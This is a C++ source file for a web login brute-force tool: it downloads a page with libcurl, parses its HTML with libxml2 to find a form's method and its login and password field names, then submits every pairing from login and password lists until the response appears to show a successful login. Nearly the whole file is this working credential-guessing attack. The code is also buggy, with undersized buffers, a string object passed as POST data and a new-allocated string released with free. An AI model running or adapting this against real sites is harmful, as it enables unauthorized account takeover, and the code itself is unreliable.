#include <stdio.h>
#include <string.h>
#include <string>
#include <curl/curl.h>
#include <libxml/HTMLparser.h>
#include <iostream>
#include <list>
using namespace std;

//
//  libxml callback context structure
//

struct Context{
	Context(): containsForm(false) { }
    const xmlChar* formMethod = NULL;
    const xmlChar* login = NULL;
    const xmlChar* password = NULL;
    const xmlChar* action = NULL;
	bool containsForm;
} form;

//
//  libcurl variables for error strings and returned data

static char errorBuffer[CURL_ERROR_SIZE];
static string buffer;

static const char* possibleLoginFields[] = {"login", "your_email", "username"}; // Possible login fields names

//
//  libcurl write callback function
//

static int writer(char *data, size_t size, size_t nmemb,
                  std::string *writerData){
  if (writerData == NULL)
	return 0;

  writerData->append(data, size*nmemb);

  return size * nmemb;
}

//
//  libcurl connection initialization
//

static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp)
{
  struct WriteThis *pooh = (struct WriteThis *)userp;
  printf("%s %s %d \n", __FILE__, __func__, __LINE__);
  if(size*nmemb < 1)
    return 0;
 
  return 0;                          /* no more data left to deliver */ 
}

static bool init(CURL *&conn, char *url){
	CURLcode code;

	curl_global_init(CURL_GLOBAL_DEFAULT);	
	conn = curl_easy_init();

	if (conn == NULL){
		fprintf(stderr, "Failed to create CURL connection\n");

		exit(EXIT_FAILURE);
	}

	code = curl_easy_setopt(conn, CURLOPT_ERRORBUFFER, errorBuffer);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set error buffer [%d]\n", code);

    	return false;
  	}

	code = curl_easy_setopt(conn, CURLOPT_URL, url);
	if (code != CURLE_OK){
		fprintf(stderr, "Failed to set URL [%s]\n", errorBuffer);

		return false;
	}

  	code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, 1L);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set redirect option [%s]\n", errorBuffer);

    	return false;
	}

	code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);

    	return false;
  	}

  	code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &buffer);
  	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);

    	return false;
  	}

  	/* we want to use our own read function */ 
	code = curl_easy_setopt(conn, CURLOPT_READFUNCTION, &read_callback);
	if (code != CURLE_OK){
    	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);

    	return false;
	}

  return true;
}

const xmlChar* findElement(const xmlChar **attributes, const char* element){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), element)){
				return *(attributes + i + 1);
			}
		}
	return NULL;
}

const xmlChar* findElementNameByType(const xmlChar **attributes, const char* elementType){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), "type") && !strcasecmp((char*)(*(attributes + i + 1)), elementType)){
			for(int j = 0; *(attributes + j) != NULL; j++){
				if(!strcasecmp((char*)(*(attributes + j)), "name")){
					return *(attributes + j + 1);
				}
			}
		}
	}
	return NULL;
}

const xmlChar* findElementValueByType(const xmlChar **attributes, const char* elementType){
	for(int i = 0; *(attributes + i) != NULL; i++){
		if(!strcasecmp((char*)(*(attributes + i)), elementType)){
				return *(attributes + i + 1);
		}
	}
	return NULL;
}

//
//  libxml start element callback function
//
static void StartElement(void *voidContext,
                         const xmlChar *name,
                         const xmlChar **attributes) {

	Context *context = (Context *)voidContext;
	if (!strcasecmp((char *)name, "form")){
		const xmlChar* tempFormMethod = findElement(attributes, "method");

		if(tempFormMethod){
			form.containsForm = true;
			form.formMethod = (xmlChar*)malloc((strlen((char*)tempFormMethod))*sizeof(xmlChar*));
			strcpy((char*)form.formMethod, (char*)tempFormMethod);
			printf("=== Found method tag  = %s \n", form.formMethod);
			form.action = findElementValueByType(attributes, "action");
			if(form.action){
				printf("=== Found action tag inside form  = %s \n", form.action);
			}
		} else {
			printf("=== Method did not founded \n");
		}
	}
	if(form.containsForm  && !strcasecmp((char *)name, "input")) {
		if(!form.password) {
			const xmlChar* tempFormPassword = findElementNameByType(attributes, "password");
			if(tempFormPassword){
				form.password = (xmlChar*)malloc((strlen((char*)tempFormPassword))*sizeof(xmlChar*));
				strcpy((char*)form.password, (char*)tempFormPassword);
				printf("=== Found password  = %s \n", form.password);
			}
		}
		if(!form.login){
			const xmlChar* tempFormLogin = findElementNameByType(attributes, "text");
			if(tempFormLogin){
				for(int i = 0; i<3; i++){
					if(!strcasecmp((char*)tempFormLogin, possibleLoginFields[i])){
						form.login = (xmlChar*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
						strcpy((char*)form.login, (char*)tempFormLogin);
						printf("=== Found login  = %s \n", form.login);
					}
				}
			}
		}
	}
}


//
//  libxml end element callback function
//

static void EndElement(void *voidContext,
                       const xmlChar *name){
  Context *context = (Context *)voidContext;
  /*if (!strcasecmp((char *)name, "form")){
	  form.containsForm = false;
  }*/
}

static htmlSAXHandler saxHandler =
{
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  StartElement,
  EndElement,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL
};

//
//  Parse given (assumed to be) HTML text and btutforce atack on the page
//

static void parseHtml(const std::string &html)
{
  htmlParserCtxtPtr ctxt;
  Context context;
  ctxt = htmlCreatePushParserCtxt(&saxHandler, &context, "", 0, "",
                                  XML_CHAR_ENCODING_NONE);
  htmlParseChunk(ctxt, html.c_str(), html.size(), 0);
  htmlParseChunk(ctxt, "", 0, 1);
  htmlFreeParserCtxt(ctxt);
}

string* concat(const xmlChar *login, string loginValue,const xmlChar *password, string passwordValue) {
	string* result = new string;

	result->append((char*)login);
	result->append("=");
	result->append(loginValue);
	result->append("&");
	result->append((char*)password);
	result->append("=");
	result->append(passwordValue);

	return result;
}

static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passwords, Context& form, CURL* conn){
	string *data;
	size_t lenLogin = 0;
	size_t lenPassword = 0;
	CURLcode res;

	cout<<__LINE__<<endl;
	//Brute force for all combinations of the given logins and passwords
	for (list<string>::iterator loginIt = logins.begin(); loginIt != logins.end(); ++loginIt){
		cout<<__LINE__<<endl;
		for (list<string>::iterator passwordIt = passwords.begin(); passwordIt != passwords.end(); ++passwordIt){
			cout<<__LINE__<<endl;
			data = concat(form.login, *loginIt, form.password, *passwordIt);
			cout<<*data<<endl;
			if(!strcasecmp((char*)form.formMethod, "post")){
				curl_easy_setopt(conn, CURLOPT_POSTFIELDS, data);
			} else if(!strcasecmp((char*)form.formMethod, "get")){
				curl_easy_setopt(conn, CURLOPT_URL,  data);
			}
			free(data);
			cout<<"perform some attack \n";
			res = curl_easy_perform(conn);
			if(res != CURLE_OK){
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
			}
			//Check if login exists inside replied page, if found one probably you logged int
			if(buffer.find(*loginIt) != string::npos){
				cout<<"Congradulation you have logged in\n";
				cout<<"Login ="<<*loginIt<<" Password ="<<*passwordIt<<endl;
				return;
			}
		}
	}
	cout<<"There is no login or password correspondance \n";
	/*while(getline(&login, &lenLogin, loginDescr)  != -1){
		printf("login = %s \n", login);
		while(getline(&password, &lenPassword, passwordDescr)  != -1){
			data = concat(form.login, login, form.password, password);
			if(!strcasecmp((char*)form.formMethod, "post")){
				curl_easy_setopt(conn, CURLOPT_POSTFIELDS, data);
			} else if(!strcasecmp((char*)form.formMethod, "get")){
				curl_easy_setopt(conn, CURLOPT_URL,  data);
			}
			free(data);
			res = curl_easy_perform(conn);
			if(res != CURLE_OK){
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
			}
			//Check if login exists inside replied page, if found one probably you logged int
			if(strstr(buffer.c_str(), login) != NULL){
				printf("Congradulation you have logged in\n");
				printf("Login =%s, Password = %s \n", login, password);
				break;
			}
		}
		fseek(passwordDescr, 0, SEEK_SET);
	}
	perror("There were no corresponding  login and password \n");*/
}

bool startAttack(string& hostName, list<string>& logins, list<string>& passwords){
	CURL *conn = NULL;
	CURLcode code;
	if (!init(conn, (char*)hostName.c_str())){
		fprintf(stderr, "Connection initializion failed\n");

		return false;
	}

	// Retrieve content for the URL
	//printf("hostName = %s \n", (char*)host);
	code = curl_easy_perform(conn);

	if (code != CURLE_OK) {
		fprintf(stderr, "Failed to get  [%s]\n", errorBuffer);

		return false;
	}

	// Parse the (assumed) HTML code

	parseHtml(buffer);

	if(!form.containsForm){
		fprintf(stderr, "There is no form in the given page \n");

		exit(EXIT_FAILURE);
	}

	if(!form.login || !form.password){
		fprintf(stderr, "There no login or password field \n");

		exit(EXIT_FAILURE);
	}
	bruteForceLoginAndPassword(logins, passwords, form, conn);
}

/*int main(int argc, char *argv[]) {
	CURL *conn = NULL;
	FILE *loginDescr = NULL;
	FILE *passwordDescr = NULL;
	CURLcode code;
	
	// Ensure one argument is given
	if (argc != 2){
		fprintf(stderr, "Usage: %s <url>\n", argv[0]);

		exit(EXIT_FAILURE);
	}

	// Initialize CURL connection

	if (!init(conn, argv[1])){
		fprintf(stderr, "Connection initializion failed\n");

		exit(EXIT_FAILURE);
	}
	
	// Retrieve content for the URL

	code = curl_easy_perform(conn);

	if (code != CURLE_OK) {
		fprintf(stderr, "Failed to get '%s' [%s]\n", argv[1], errorBuffer);

		exit(EXIT_FAILURE);
	}

	// Parse the (assumed) HTML code

	parseHtml(buffer);

	if(!form.containsForm){
		fprintf(stderr, "There is no form in the given page \n");

		exit(EXIT_FAILURE);
	}

	if(!form.login || !form.password){
		fprintf(stderr, "There no login or password field \n");

		exit(EXIT_FAILURE);
	}

	loginDescr = fopen("logins.txt", "r");

	if(loginDescr == NULL){
		perror("Error opening file containing logins");
		return(-1);
	}

	passwordDescr = fopen("passwords.txt", "r");
	if(passwordDescr == NULL){
		perror("Error opening file containing passwords");
		return(-1);
	}
	
	bruteForceLoginAndPassword(loginDescr, passwordDescr, form, conn);

	fclose(loginDescr);
	fclose(passwordDescr);
	curl_easy_cleanup(conn);
	return EXIT_SUCCESS;
}*/
